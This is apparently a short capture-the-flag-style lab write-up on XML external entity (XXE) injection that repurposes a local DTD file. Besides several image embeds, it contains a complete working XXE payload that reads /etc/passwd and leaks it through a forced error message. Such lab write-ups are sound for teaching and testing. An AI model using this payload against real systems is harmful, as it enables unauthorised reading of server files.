![[fileDontExist.png]]

![[fileExists.png]]

Following the lab's hint obtain the open source file:

![[entityFile.png]]

From there all of this entities are available for usage.

Craft an appropriate payload:

```XML
<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> <!ENTITY % ISOamso ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error; '> %local_dtd; ]>
```

Trigger it within the request and the lab is solved!

![[XXE/Labs/XXE Repurposing Local DTD/images/exploited.png]]

